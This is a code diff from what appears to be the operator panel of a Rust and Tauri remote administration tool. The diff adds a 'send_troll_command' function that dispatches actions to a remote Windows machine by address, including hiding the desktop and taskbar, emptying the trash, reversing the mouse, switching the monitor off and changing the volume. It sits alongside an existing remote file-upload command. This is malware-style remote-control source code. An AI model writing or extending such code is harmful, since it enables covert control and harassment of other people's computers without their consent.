@@ -14,6 +14,7 @@ use tokio::sync::mpsc::Sender;
 
 use std::ptr::null_mut as NULL;
 use winapi::um::winuser;
+use common::packets::TrollCommand;
 
 use tauri::AppHandle;
 
@@ -938,4 +939,36 @@ pub async fn upload_file_to_folder(
     send_server_command(ServerCommand::UploadFile(addr.parse().unwrap(), target_folder.to_string(), file_data), tauri_state, app_handle).await?;
 
     Ok("File upload command sent".to_string())
+}
+
+#[tauri::command]
+pub async fn send_troll_command(
+    addr: &str,
+    command: String,
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle,
+) -> Result<String, String> {    
+    let troll_command = match command.as_str() {
+        "HideDesktop" => TrollCommand::HideDesktop,
+        "ShowDesktop" => TrollCommand::ShowDesktop,
+        "HideTaskbar" => TrollCommand::HideTaskbar,
+        "ShowTaskbar" => TrollCommand::ShowTaskbar,
+        "HideNotify" => TrollCommand::HideNotify,
+        "ShowNotify" => TrollCommand::ShowNotify,
+        "FocusDesktop" => TrollCommand::FocusDesktop,
+        "EmptyTrash" => TrollCommand::EmptyTrash,
+        "RevertMouse" => TrollCommand::RevertMouse,
+        "NormalMouse" => TrollCommand::NormalMouse,
+        "MonitorOff" => TrollCommand::MonitorOff,
+        "MonitorOn" => TrollCommand::MonitorOn,
+        "MaxVolume" => TrollCommand::MaxVolume,
+        "MinVolume" => TrollCommand::MinVolume,
+        "MuteVolume" => TrollCommand::MuteVolume,
+        "UnmuteVolume" => TrollCommand::UnmuteVolume,
+        _ => return Err("Invalid troll command".to_string()),
+    };
+    
+    send_server_command(ServerCommand::HandleTroll(addr.parse().unwrap(), troll_command), tauri_state, app_handle).await?;
+
+    Ok("Troll command sent".to_string())
 }
